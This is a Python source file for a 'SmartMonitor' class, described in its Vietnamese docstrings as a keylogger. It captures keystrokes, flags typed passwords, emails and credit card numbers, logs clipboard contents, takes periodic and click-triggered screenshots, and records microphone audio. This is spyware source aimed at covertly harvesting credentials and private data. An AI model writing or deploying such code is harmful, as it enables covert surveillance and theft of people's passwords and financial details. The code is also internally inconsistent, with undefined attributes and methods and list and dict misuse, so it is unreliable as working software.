from __future__ import annotations
import os
import json
import threading
import time
from datetime import datetime
from typing import Dict, List, Optional, Any, Set
from pathlib import Path
from pynput import keyboard, mouse
import pyautogui
import pyperclip
import sounddevice as sd
import wave
import numpy as np
import cv2
import re
import logging

from collections import defaultdict

class SmartMonitor:
    def __init__(self, log_dir: str = "logs") -> None:
        # Initialize logging
        self.log_dir = Path(log_dir)
        self.log_dir.mkdir(parents=True, exist_ok=True)
        self.logs: Dict[str, List[Dict[str, Any]]] = defaultdict(list)
        self.lock = threading.Lock()
        self.logger = logging.getLogger(__name__)
        
        # Monitor flags
        self.running = False
        self.keyboard_listener: Optional[keyboard.Listener] = None
        self.mouse_listener: Optional[mouse.Listener] = None
        
        # Buffer and analysis
        self.key_buffer = []
        self.word_buffer = []
        self.interesting_patterns = {
            'email': r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
            'url': r'https?://(?:[-\w.]|(?:%[\da-fA-F]{2}))+[^\s]*',
            'password': r'password|passwd|pwd',
            'credit_card': r'\b\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4}\b'
        }
        
        # Screenshots
        self.screenshot_interval = 60  # seconds
        self.screenshot_events = {
            'mouse_click': True,
            'key_combo': True,
            'window_change': True
        }
        
        # Audio recording
        self.audio_chunk = 1024
        self.audio_format = np.int16
        self.channels = 1
        self.rate = 44100
        self.audio_buffer = []
        
        # Clipboard
        self.last_clipboard = ""
        self.clipboard_history: Set[str] = set()
        
    def start(self) -> bool:
        """Start all monitoring functions"""
        if not self.running:
            try:
                self.running = True
                
                # Start keyboard monitoring
                self.keyboard_listener = keyboard.Listener(
                    on_press=self._on_press,
                    on_release=self._on_release
                )
                self.keyboard_listener.start()
                
                # Start mouse monitoring
                self.mouse_listener = mouse.Listener(
                    on_click=self._on_click,
                    on_move=self._on_move
                )
                self.mouse_listener.start()
                
                # Start background threads
                threading.Thread(target=self._screenshot_loop, daemon=True).start()
                threading.Thread(target=self._clipboard_loop, daemon=True).start()
                threading.Thread(target=self._audio_loop, daemon=True).start()
                threading.Thread(target=self._save_loop, daemon=True).start()
                
                self.logger.info("Smart monitoring started")
                return True
                
            except Exception as e:
                self.logger.error(f"Error starting monitor: {str(e)}")
                self.running = False
                return False
                
        return False
        
    def stop(self) -> bool:
        """Dừng keylogger

        Returns:
            bool: True nếu dừng thành công
        """
        if self.running:
            try:
                self.running = False
                if self.listener:
                    self.listener.stop()
                self.save_logs()
                self.logger.info("Keylogger stopped")
                return True
            except Exception as e:
                self.logger.error(f"Error stopping keylogger: {str(e)}")
                return False
        return False
        
    def _on_press(self, key: keyboard.Key | keyboard.KeyCode) -> None:
        """Process key press events with smart filtering"""
        if not self.running:
            return
            
        try:
            # Convert key to string
            key_str = self._key_to_string(key)
            
            # Add to key buffer
            self.key_buffer.append(key_str)
            
            # Process word when space or enter is pressed
            if key in [keyboard.Key.space, keyboard.Key.enter]:
                self._process_word(''.join(self.word_buffer))
                self.word_buffer.clear()
            elif isinstance(key, keyboard.KeyCode) and key.char:
                self.word_buffer.append(key.char)
                
            # Check for interesting key combinations
            if self._check_interesting_combo(key):
                self._take_screenshot('key_combo')
                
            # Create log entry with context
            log_entry = {
                'timestamp': datetime.now().isoformat(),
                'type': 'press',
                'key': key_str,
                'window': self._get_active_window(),
                'interesting': self._check_interesting_key(key)
            }
            
            # Add to logs
            with self.lock:
                self.logs['keyboard'].append(log_entry)
                
        except Exception as e:
            self.logger.error(f"Error processing keypress: {str(e)}")
            
    def _on_release(self, key: keyboard.Key | keyboard.KeyCode) -> None:
        """Callback khi có phím được nhả

        Args:
            key (keyboard.Key | keyboard.KeyCode): Phím được nhả
        """
        if not self.running:
            return
            
        try:
            key_str = self._key_to_string(key)
            
            log_entry = {
                'timestamp': datetime.now().isoformat(),
                'type': 'release',
                'key': key_str
            }
            
            with self.lock:
                self.logs.append(log_entry)
                
        except Exception as e:
            self.logger.error(f"Error logging key release: {str(e)}")
            
    def _key_to_string(self, key: keyboard.Key | keyboard.KeyCode) -> str:
        """Convert key object to string

        Args:
            key (keyboard.Key | keyboard.KeyCode): Key to convert

        Returns:
            str: String representation of key
        """
        try:
            if isinstance(key, keyboard.KeyCode):
                return key.char or f'<{key.vk}>'
            return str(key)
        except:
            return '<error>'
            
    def _auto_save(self) -> None:
        """Tự động lưu log định kỳ"""
        while self.running:
            time.sleep(60)  # Save every minute
            self.save_logs()
            
    def save_logs(self) -> bool:
        """Lưu logs ra file

        Returns:
            bool: True nếu lưu thành công
        """
        if not self.logs:
            return True
            
        try:
            with self.lock:
                # Get current logs and clear buffer
                current_logs = self.logs.copy()
                self.logs.clear()
                
            # Save to file
            with open(self.log_file, 'a') as f:
                for log in current_logs:
                    f.write(json.dumps(log) + '\n')
                    
            return True
            
        except Exception as e:
            self.logger.error(f"Error saving logs: {str(e)}")
            return False
            
    def get_logs(self) -> List[Dict[str, Any]]:
        """Lấy toàn bộ log

        Returns:
            List[Dict[str, Any]]: Danh sách các log entry
        """
        logs: List[Dict[str, Any]] = []
        
        # Read from file
        if self.log_file.exists():
            try:
                with open(self.log_file) as f:
                    for line in f:
                        logs.append(json.loads(line.strip()))
            except Exception as e:
                self.logger.error(f"Error reading log file: {str(e)}")
                
        # Add logs in memory
        with self.lock:
            logs.extend(self.logs)
            
        return logs
        
    def clear_logs(self) -> bool:
        """Xóa toàn bộ log

        Returns:
            bool: True nếu xóa thành công
        """
        try:
            with self.lock:
                self.logs.clear()
                
            if self.log_file.exists():
                self.log_file.unlink()
                
            return True
            
        except Exception as e:
            self.logger.error(f"Error clearing logs: {str(e)}")
            return False
            
    def _process_word(self, word: str) -> None:
        """Analyze completed word for interesting patterns"""
        if not word:
            return
            
        # Check against patterns
        for pattern_name, pattern in self.interesting_patterns.items():
            if re.search(pattern, word, re.IGNORECASE):
                log_entry = {
                    'timestamp': datetime.now().isoformat(),
                    'type': 'pattern_match',
                    'pattern': pattern_name,
                    'content': word,
                    'window': self._get_active_window()
                }
                with self.lock:
                    self.logs['patterns'].append(log_entry)
                    
    def _check_interesting_combo(self, key: keyboard.Key | keyboard.KeyCode) -> bool:
        """Check for interesting key combinations"""
        interesting_combos = {
            {keyboard.Key.ctrl_l, keyboard.Key.c},  # Copy
            {keyboard.Key.ctrl_l, keyboard.Key.v},  # Paste
            {keyboard.Key.alt_l, keyboard.Key.tab},  # Window switch
            {keyboard.Key.ctrl_l, keyboard.Key.alt_l, keyboard.Key.delete}  # System
        }
        return any(combo.issubset(set(self.key_buffer[-3:])) for combo in interesting_combos)
        
    def _on_click(self, x: int, y: int, button: mouse.Button, pressed: bool) -> None:
        """Handle mouse clicks"""
        if not self.running or not pressed:
            return
            
        try:
            log_entry = {
                'timestamp': datetime.now().isoformat(),
                'type': 'click',
                'position': (x, y),
                'button': str(button),
                'window': self._get_active_window()
            }
            
            with self.lock:
                self.logs['mouse'].append(log_entry)
                
            if self.screenshot_events['mouse_click']:
                self._take_screenshot('mouse_click')
                
        except Exception as e:
            self.logger.error(f"Error logging mouse click: {str(e)}")
            
    def _on_move(self, x: int, y: int) -> None:
        """Track mouse movement"""
        pass  # Only log if needed
        
    def _screenshot_loop(self) -> None:
        """Periodic screenshot capture"""
        while self.running:
            try:
                self._take_screenshot('interval')
                time.sleep(self.screenshot_interval)
            except:
                time.sleep(self.screenshot_interval)
                
    def _take_screenshot(self, trigger: str) -> None:
        """Capture and save screenshot"""
        try:
            timestamp = datetime.now()
            filename = self.log_dir / f"screenshot_{timestamp:%Y%m%d_%H%M%S}_{trigger}.png"
            
            # Capture screen
            screenshot = pyautogui.screenshot()
            screenshot.save(filename)
            
            # Log screenshot
            log_entry = {
                'timestamp': timestamp.isoformat(),
                'type': 'screenshot',
                'trigger': trigger,
                'file': str(filename),
                'window': self._get_active_window()
            }
            
            with self.lock:
                self.logs['screenshots'].append(log_entry)
                
        except Exception as e:
            self.logger.error(f"Error capturing screenshot: {str(e)}")
            
    def _clipboard_loop(self) -> None:
        """Monitor clipboard changes"""
        while self.running:
            try:
                current = pyperclip.paste()
                if current != self.last_clipboard and current:
                    # Check if content is interesting
                    is_interesting = any(
                        re.search(pattern, current, re.IGNORECASE)
                        for pattern in self.interesting_patterns.values()
                    )
                    
                    # Log if interesting or not seen before
                    if is_interesting or current not in self.clipboard_history:
                        log_entry = {
                            'timestamp': datetime.now().isoformat(),
                            'type': 'clipboard',
                            'content': current,
                            'interesting': is_interesting,
                            'window': self._get_active_window()
                        }
                        
                        with self.lock:
                            self.logs['clipboard'].append(log_entry)
                            
                        self.clipboard_history.add(current)
                        self.last_clipboard = current
                        
                time.sleep(1)
            except:
                time.sleep(1)
                
    def _audio_loop(self) -> None:
        """Record audio when significant sound is detected"""
        try:
            def audio_callback(indata, frames, time, status):
                if status:
                    return
                volume_norm = np.linalg.norm(indata) * 10
                if volume_norm > 0.5:  # Adjust threshold
                    self.audio_buffer.extend(indata)
                    
            with sd.InputStream(callback=audio_callback,
                              channels=self.channels,
                              samplerate=self.rate):
                while self.running:
                    time.sleep(0.1)
                    if len(self.audio_buffer) > self.rate * 5:  # 5 seconds
                        self._save_audio()
                        
        except Exception as e:
            self.logger.error(f"Error in audio recording: {str(e)}")
            
    def _save_audio(self) -> None:
        """Save recorded audio buffer"""
        if not self.audio_buffer:
            return
            
        try:
            timestamp = datetime.now()
            filename = self.log_dir / f"audio_{timestamp:%Y%m%d_%H%M%S}.wav"
            
            with wave.open(str(filename), 'wb') as wf:
                wf.setnchannels(self.channels)
                wf.setsampwidth(2)  # 16-bit
                wf.setframerate(self.rate)
                wf.writeframes(np.array(self.audio_buffer).tobytes())
                
            log_entry = {
                'timestamp': timestamp.isoformat(),
                'type': 'audio',
                'file': str(filename),
                'duration': len(self.audio_buffer) / self.rate,
                'window': self._get_active_window()
            }
            
            with self.lock:
                self.logs['audio'].append(log_entry)
                
            self.audio_buffer.clear()
            
        except Exception as e:
            self.logger.error(f"Error saving audio: {str(e)}")
            
    def _get_active_window(self) -> str:
        """Get title of active window"""
        try:
            import win32gui
            return win32gui.GetWindowText(win32gui.GetForegroundWindow())
        except:
            return "Unknown"